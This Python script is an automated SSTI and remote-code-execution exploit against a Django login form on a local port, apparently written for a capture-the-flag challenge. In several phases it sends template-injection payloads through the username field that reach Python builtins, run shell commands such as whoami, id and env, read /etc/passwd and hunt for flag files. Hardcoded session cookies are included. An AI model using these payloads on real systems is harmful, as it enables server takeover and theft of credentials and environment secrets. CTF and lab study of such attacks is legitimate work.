import requests
import re
import sys
import time

# Configuration
target_url = "http://127.0.0.1:33149/accounts/login"
# CSRF token from form (will be updated from actual page)
csrfmiddlewaretoken = "ul3a3DWJvBfgDxgTusfwVE3QzYJBAzrhDBx7bRgRf3xEu1HspSsqOziC6q7T68Ub"
# Cookies from browser
csrftoken_cookie = "jqE7iouiUCsy1EBJ5An435pWHCysGJD4"
sessionid_cookie = "66u2wxpmyuyx2zfyxpyt7122z50a5vuy"

# Setup session
session = requests.Session()
session.cookies.set('csrftoken', csrftoken_cookie, domain='127.0.0.1', path='/')
session.cookies.set('sessionid', sessionid_cookie, domain='127.0.0.1', path='/')

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0'
}

def test_payload(payload_name, payload_data):
    """Test a payload and return the response"""
    try:
        # Get fresh CSRF token first
        print(f"\n{'='*80}")
        print(f"[*] Testing: {payload_name}")
        print(f"[*] Payload: {payload_data.get('username', 'N/A')}")
        print(f"{'='*80}")
        
        # Get the login page to refresh CSRF token
        get_resp = session.get(target_url, headers=headers, timeout=10)
        
        # Extract CSRF token from page
        csrf_token_match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', get_resp.text)
        if csrf_token_match:
            current_csrf_token = csrf_token_match.group(1)
            print(f"[+] Extracted fresh CSRF token: {current_csrf_token[:50]}...")
        else:
            current_csrf_token = csrfmiddlewaretoken
            print(f"[!] Could not extract CSRF token, using provided one")
        
        # Prepare login data
        login_data = {
            'csrfmiddlewaretoken': current_csrf_token,
            'username': payload_data.get('username', 'admin'),
            'password': payload_data.get('password', 'test'),
            'login': 'submit'
        }
        
        # Add referer header
        request_headers = headers.copy()
        request_headers['Referer'] = target_url
        request_headers['Origin'] = 'http://127.0.0.1:33149'
        
        # Send login request
        response = session.post(
            target_url,
            data=login_data,
            headers=request_headers,
            timeout=15,
            allow_redirects=True
        )
        
        print(f"[+] Request sent successfully")
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] URL: {response.url}")
        print(f"[+] Response Length: {len(response.text)} bytes")
        
        # Check for FLAG pattern
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flag_matches:
            print(f"\n{'!'*80}")
            print(f"[!] FLAG FOUND: {flag_matches[0]}")
            print(f"{'!'*80}\n")
        else:
            print(f"[-] No FLAG pattern found in response")
        
        # Print response preview
        print(f"\n[+] Full Response:\n")
        print(response.text)
        print(f"\n{'='*80}\n")
        
        return response
        
    except Exception as e:
        print(f"[!] Error testing payload '{payload_name}': {str(e)}")
        return None

# Payload Definitions
print("[*] Starting Django SSTI/RCE Testing")
print("[*] Target URL: " + target_url)

# Phase 1: Basic Context Object Discovery
print("\n\n[PHASE 1] Testing Basic Context Objects")
basic_payloads = [
    ("Basic String Class", {"username": "{{''.__class__}}", "password": "test"}),
    ("Basic Tuple Class", {"username": "{{().__class__}}", "password": "test"}),
    ("Basic List Class", {"username": "{{[].__class__}}", "password": "test"}),
    ("Basic Dict Class", {"username": "{{{}.__class__}}", "password": "test"}),
]

for name, data in basic_payloads:
    test_payload(name, data)
    time.sleep(0.5)

# Phase 2: Object Traversal Chain Discovery
print("\n\n[PHASE 2] Testing Object Traversal")
traversal_payloads = [
    ("MRO Access", {"username": "{{''.__class__.__mro__}}", "password": "test"}),
    ("Object Subclasses", {"username": "{{''.__class__.__mro__[1].__subclasses__()}}", "password": "test"}),
    ("Specific Subclass Count", {"username": "{{''.__class__.__mro__[1].__subclasses__().__len__()}}", "password": "test"}),
]

for name, data in traversal_payloads:
    test_payload(name, data)
    time.sleep(0.5)

# Phase 3: Test Specific Class Indices (130-150)
print("\n\n[PHASE 3] Testing Specific Class Indices for File Read/Command Execution")
print("[*] Searching for useful classes between indices 130-150")

# Common indices where useful classes are found
test_indices = [130, 132, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150]

for idx in test_indices:
    print(f"\n\n{'='*50}")
    print(f"Testing Index: {idx}")
    print(f"{'='*50}")
    
    # Test 1: Try to access __builtins__
    payload1 = f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']}}}}"
    test_payload(f"Index {idx} - Access __builtins__", {"username": payload1, "password": "test"})
    time.sleep(0.5)
    
    # Test 2: Try to get os module
    payload2 = f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__.get('os')}}}}"
    test_payload(f"Index {idx} - Get os module", {"username": payload2, "password": "test"})
    time.sleep(0.5)
    
    # Test 3: Try to list system
    payload3 = f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['__import__']('os').listdir('/')}}}}"
    test_payload(f"Index {idx} - List root directory", {"username": payload3, "password": "test"})
    time.sleep(0.5)
    
    # Test 4: Search for FLAG files
    payload4 = f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['find','/','-name','FLAG*','2>/devdev/null']).decode()}}}}"
    test_payload(f"Index {idx} - Find FLAG files", {"username": payload4, "password": "test"})
    time.sleep(0.5)
    
    # Test 5: Read /etc/passwd (common test)
    payload5 = f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}}}"
    test_payload(f"Index {idx} - Read /etc/passwd", {"username": payload5, "password": "test"})
    time.sleep(1)  # Longer delay for these tests

# Phase 4: More Aggressive Command Execution Attempts
print("\n\n[PHASE 4] Aggressive Command Execution Attempts")

# Try to find subprocess and execute commands
cmd_payloads = [
    ("Execute whoami", "{{''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['whoami']).decode()}}"),
    ("Execute id", "{{''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['id']).decode()}}"),
    ("List current dir", "{{''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['ls','-la']).decode()}}"),
    ("Find FLAG in cwd", "{{''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['find','.','-name','FLAG*']).decode()}}"),
    ("Execute env", "{{''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['env']).decode()}}"),
]

for name, cmd_payload in cmd_payloads:
    test_payload(name, {"username": cmd_payload, "password": "test"})
    time.sleep(1)

# Phase 5: Direct File Read Attempts with Different Indices
print("\n\n[PHASE 5] Direct File Read Attempts")

# Try to read common locations where FLAG might be
file_payloads = [
    (f"Read FLAG at index {idx} - /flag", f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['open']('/flag').read()}}}}") for idx in [138, 139, 140]
]
file_payloads.extend([
    (f"Read FLAG at index {idx} - /FLAG", f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['open']('/FLAG').read()}}}}") for idx in [138, 139, 140]
])
file_payloads.extend([
    (f"Read FLAG at index {idx} - /tmp/FLAG", f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['open']('/tmp/FLAG').read()}}}}") for idx in [138, 139, 140]
])
file_payloads.extend([
    (f"Read FLAG at index {idx} - /app/FLAG", f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['open']('/app/FLAG').read()}}}}") for idx in [138, 139, 140]
])

for name, payload in file_payloads:
    test_payload(name, {"username": payload, "password": "test"})
    time.sleep(0.5)

# Phase 6: Final Summary
print("\n\n" + "="*80)
print("[*] TESTING COMPLETE")
print("[*] Summary: Tested multiple Django SSTI/RCE payload chains")
print("[*] Checked class indices 130-150 for vulnerable classes")
print("[*] Attempted file reads and command executions")
print("[*] If FLAG was found, it should be displayed above with '!!!' markers")
print("="*80)

sys.exit(0)
